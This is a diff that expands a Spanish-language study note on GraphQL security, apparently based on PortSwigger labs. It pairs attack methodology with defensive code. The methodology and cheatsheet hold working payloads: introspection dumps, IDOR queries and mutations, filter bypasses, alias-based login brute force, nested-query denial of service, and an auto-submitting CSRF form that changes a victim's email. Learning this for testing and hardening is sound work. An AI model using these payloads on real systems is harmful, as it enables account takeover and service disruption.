@@ -1,14 +1,53 @@
 ---
-aliases: ["GraphQL Introspection", "GraphQL Mutations", "GraphQL IDOR"]
-tags: ["hacking/web", "redes/conceptos"]
-estado: 🟢 Terminado
+aliases: ["GraphQL Introspection", "GraphQL Mutations", "GraphQL IDOR", "GraphQL"]
+tags:
+  - sec/web
+  - sec/web/api
+  - sec/web/idor
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Insecure Direct Object References IDOR]]"
+  - "[[Abuso de APIs]]"
+  - "[[Ataque de Asignación Masiva]]"
+  - "[[Cross-Site Request Forgery (CSRF)]]"
+  - "[[Gestión de Autenticación]]"
+  - "[[Reconocimiento y Escaneo de Redes y Web]]"
+fuente: "https://portswigger.net/web-security/graphql"
 ---
-	# GraphQL: Introspección y Mutaciones en Ataques IDOR
+
+# GraphQL: Introspección y Mutaciones en Ataques IDOR
 
 **GraphQL** es un lenguaje de consulta para **APIs (Application Programming Interfaces)** que se ha vuelto cada vez más popular en los últimos años. A diferencia de las APIs tradicionales que tienen *endpoints* fijos, GraphQL permite a los clientes solicitar solo la información que necesitan y obtener una respuesta personalizada en función de sus necesidades.
 
 > [!info] GraphQL vs. REST
 > Mientras que las APIs RESTful a menudo requieren múltiples solicitudes a diferentes *endpoints* para obtener todos los datos relacionados, GraphQL permite obtener todos los datos necesarios en una sola solicitud, lo que reduce la sobrecarga de red y mejora la eficiencia, especialmente en aplicaciones móviles. También resuelve el problema de *over-fetching* (recibir más datos de los necesarios) y *under-fetching* (recibir menos datos de los necesarios).
+
+## Mecánica: cómo resuelve GraphQL una consulta
+
+Un servidor GraphQL suele exponer **un solo endpoint** (p. ej. `POST /graphql` o `POST /api`) que recibe siempre la misma forma:
+
+```json
+{"query": "query($id: ID!) { user(id: $id) { name email role } }",
+ "variables": {"id": "123"}}
+```
+
+Por debajo:
+
+| Concepto | Rol | Relevancia ofensiva |
+|---|---|---|
+| **Schema (SDL)** | Contrato de tipos, `Query` (lectura) y `Mutation` (escritura) | La introspección lo vuelca entero: mapa de superficie de ataque |
+| **Resolvers** | Función por campo que trae los datos | El control de acceso debe estar **en cada resolver**, no en la capa HTTP |
+| **Introspección** | Meta-esquema `__schema`/`__type`/`__typename` | Enumeración sin fuzzing |
+| **Variables** | Parámetros tipados separados del string de la query | Permiten atacar `id`/`username` como cualquier parámetro (IDOR, [[Ataque de Asignación Masiva]]) |
+| **Aliases** | `a1: login(...) a2: login(...)` | Múltiples operaciones idénticas **en una petición** → bypass de rate limit |
+| **Fragments** | Reutilización de selección | Amplifican queries anidadas (DoS por complejidad) |
+| **Batching (array)** | `[{query...},{query...}]` | N operaciones por request → evade contadores por petición |
+
+> [!tip] Regla de ataque en GraphQL
+> **Cada campo del esquema es un endpoint potencial.** En REST enumeras rutas; en GraphQL vuelcas el esquema y atacas *fields* e *IDs*. El mismo [[Insecure Direct Object References IDOR]] que en REST aparece aquí como `user(id: "123")`, y la autorización debe validarse **dentro del resolver sobre el objeto devuelto**, no asumirse por estar autenticado.
 
 ## Introspección en GraphQL
 
@@ -54,7 +93,29 @@ Los atacantes también pueden utilizar las Mutaciones de GraphQL para llevar a c
 
 En resumen, GraphQL es un lenguaje de consulta para APIs que permite a los clientes solicitar solo la información que necesitan. Es importante que los desarrolladores de APIs protejan adecuadamente la introspección y las mutaciones para evitar ataques maliciosos por parte de los atacantes.
 
-# Notas Practicas
+## Metodología de ataque en GraphQL
+
+1. **Descubrir el endpoint**: no asumas `/graphql`. Fuzzing de rutas comunes (`/graphql`, `/api`, `/graphiql`, `/gql`, `/v1/graphql`, `/altair`) — ver laboratorio *Finding a hidden GraphQL endpoint*. Distingue respuestas: `Cannot query` / `Query missing` / GraphQL error ≠ `404 Not Found`.
+2. **Confirmar que es GraphQL**: envía `POST /` con `{"query":"{__typename}"}` → `{"data":{"__typename":"..."}}`.
+3. **Vomitar el esquema**: introspección (`IntrospectionQuery` de Burp: *GraphQL > Set introspection query*) → JSON → [GraphQL Voyager](https://required.gitbook.io/graphql-voyager/) para visualizar tipos y relaciones. Si está bloqueado, adivina campos (`user`, `post`, `admin`) o usa fragments de tipos descubiertos.
+4. **Mapear operaciones**: lista de `Query` y `Mutation` con sus argumentos = lista de objetivos. Identifica qué mutation toma IDs u objetos editables.
+5. **Probar autorización por campo**: para cada campo con ID, usa dos cuentas (A y B) y compara respuestas → IDOR horizontal; intenta campos admin con cuenta normal → vertical. Ver [[Labs - Control de Acceso]].
+6. **Atacar protecciones por petición**: aliases y batching para fuerza bruta (lab *Bypassing GraphQL brute force protections*).
+7. **DoS por profundidad/complejidad**: anida el mismo campo 10–20 veces; sin límite, el resolver recursivo revienta el servidor.
+8. **CSRF**: si el endpoint acepta `application/x-www-form-urlencoded` y usa cookies, monta un form HTML (lab *Performing CSRF exploits over GraphQL*) — ver [[Cross-Site Request Forgery (CSRF)]].
+
+| Vector | Payload mínimo | Señales |
+|---|---|---|
+| Introspección | `{__schema{types{name fields{name}}}}` | Esquema completo |
+| IDOR en query | `query{user(id:"VICTIM_ID"){...}}` | Datos de otra cuenta |
+| IDOR en mutation | `mutation{updateUser(id:"VICTIM",email:"x@x"){ok}}` | Estado cambiado |
+| Bypass de WAF/regex por introspección | Saltos de línea / `\u005fschema` / espacios en `__schema` | Error de filtro desaparece |
+| Rate-limit bypass | `alias_1: login(...) alias_2: login(...)` o `[{...},{...}]` | N intentos por request |
+| DoS | `{a{a{a{a{a{a{a{a{a{ name }}}}}}}}}}` | 500 / timeout |
+
+## Laboratorios (PortSwigger — GraphQL)
+
+## Notas Prácticas
 
 ## Graphql IDOR
 
@@ -374,3 +435,132 @@ Como observamos tenemos listo y lo enviamos.
 ![[Pasted image 20260310160437.png]]
 
 Laboratorio completado.
+
+## Defensa: GraphQL seguro
+
+### 1. Deshabilitar introspección y herramientas de exploración en producción
+
+```javascript
+// Apollo Server
+const server = new ApolloServer({
+  schema,
+  introspection: false,          // producción
+  playground: process.env.NODE_ENV !== 'production',  // solo en dev
+});
+```
+
+```python
+# Graphene (GraphQL-core) — middleware que bloquea __schema/__type
+BLOCKED = ("__schema", "__type", "introspection")
+def introspection_block_middleware(next, root, info, **args):
+    if any(b in info.field_name for b in BLOCKED):
+        raise Exception("introspección deshabilitada")
+    return next(root, info, **args)
+```
+
+> [!warning] Deshabilitar introspección no es autorización
+> Los campos siguen siendo adivinables y el esquema se filtra en el JS del frontend. Es **hardening**, no control de acceso. La autorización va en los resolvers.
+
+### 2. Autorización a nivel de campo Y de objeto (anti-IDOR)
+
+```python
+# ❌ El resolver confía en el id del cliente
+def resolve_user(root, info, id):
+    return User.get(id)
+
+# ✅ Autorización sobre el objeto devuelto
+@resolver_guard(roles=["admin"])          # control de tipo (vertical)
+def resolve_user(root, info, id):
+    user = User.get(id)
+    if not (info.context.user.is_admin or user.id == info.context.user.id):
+        raise Forbidden()                  # control de instancia (horizontal)
+    return user
+```
+
+La misma guarda se aplica en **mutaciones antes** de ejecutar el cambio: `updateUser`, `deleteUser`, `changeEmail`... Ver [[Insecure Direct Object References IDOR]] y [[Ataque de Asignación Masiva]] (mutaciones que aceptan campos como `role`, `isAdmin`).
+
+### 3. Límites de profundidad, complejidad y batching
+
+```javascript
+// depth-limit + cost analysis
+import depthLimit from 'graphql-depth-limit';
+import { createComplexityLimitRule } from 'graphql-validation-complexity';
+
+const server = new ApolloServer({
+  validationRules: [
+    depthLimit(7),                            // profundidad máxima
+    createComplexityLimitRule(1000),          // coste acumulado
+  ],
+});
+
+// batching: máximo 1 operación por petición
+if (Array.isArray(req.body)) reject(req, 'batching deshabilitado');
+```
+
+### 4. Rate limiting por operación, no por petición
+
+Cuenta intentos de `login`/`resetPassword` **dentro del resolver**, con la identidad intentada como clave: los aliases multiplican operaciones, así que el contador debe incrementarse en cada alias ejecutado.
+
+### 5. Endpoints endurecidos
+
+- Aceptar solo `POST` con `application/json` (el form-urlencoded habilita CSRF de [[Cross-Site Request Forgery (CSRF)]]).
+- Exigir `Origin`/`Sec-Fetch-Site` coherentes si la auth es por cookie; mejor aún: autenticación por `Authorization` header (no cookies).
+- WAF con reglas GraphQL-aware y normalización previa (evita el bypass por saltos de línea/`\u005f`).
+
+## Errores comunes
+
+**Atacante:**
+- Fuzzear rutas REST olvidando que GraphQL puede vivir en cualquier path (incluso detrás de un microfrontend).
+- Copiar la IntrospectionQuery de Burp sin reparar los `__` dobles cuando el WAF los filtra: usa `__` o saltos de línea.
+- Probar IDOR solo en queries y olvidar las **mutaciones** (donde está el daño real: update/delete).
+- Fuerza bruta con aliases sin comprobar primero si el servidor acepta arrays (batching) — es más eficiente.
+- No mirar `data` dentro de `errors`: GraphQL devuelve 200 con errores parciales por resolver.
+
+**Defensor:**
+- Poner la autorización solo en la capa HTTP del endpoint y no en los resolvers (cada campo es un endpoint).
+- Asumir que "sin introspección no encuentran nada".
+- Aceptar arrays/batches ilimitados y aliases sin techo de coste.
+- Devolver campos internos (`password`, `postPassword`, tokens) en los payloads de respuesta por defecto.
+
+## Cheatsheet
+
+```
+# Confirmar GraphQL
+POST /any-path   {"query":"{__typename}"}
+
+# Enumeración
+#   Burp: pestaña GraphQL > Set introspection query
+#   Visualizar: graphql-voyager (pegar el JSON)
+query { __schema { queryType{fields{name}} mutationType{fields{name}} } }
+query { __type(name:"User"){ fields{ name type{ name } } } }
+
+# Endpoint oculto — wordlist de rutas
+/graphql /api /graphiql /gql /altair /playground /v1/graphql /api/graphql
+
+# Bypass de filtro de introspección
+{ __schema }   con \n antes/después   o   \u005fschema
+
+# IDOR: dos cuentas, mismo campo, id ajeno
+query($id:ID!){ user(id:$id){ email } }   variables: {"id":"<id_victima>"}
+
+# Bypass de rate limit con aliases (una petición = N intentos)
+query {
+  a1: login(input:{username:"carlos",password:"1234"}) { token success }
+  a2: login(input:{username:"carlos",password:"password"}) { token success }
+}
+
+# DoS por profundidad
+{a{a{a{a{a{a{a{a{a{ name }}}}}}}}}}}
+
+# CSRF (si acepta form-urlencoded + cookies)
+<form action="https://target/graphql" method="POST">
+  <input name='query' value='mutation{changeEmail(input:{email:"evil@x"}){email}}'>
+</form><script>document.forms[0].submit()</script>
+```
+
+## Referencias
+
+- PortSwigger Academy — GraphQL: https://portswigger.net/web-security/graphql
+- HackTricks — GraphQL Injection: https://book.hacktricks.wiki/en/pentesting-web/graphql-exploration.html
+- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
+- Related internals: [[Insecure Direct Object References IDOR]] · [[Abuso de APIs]] · [[Ataque de Asignación Masiva]] · [[Cross-Site Request Forgery (CSRF)]] · [[Gestión de Autenticación]] · [[Labs - Control de Acceso]] · [[Reconocimiento y Escaneo de Redes y Web]]
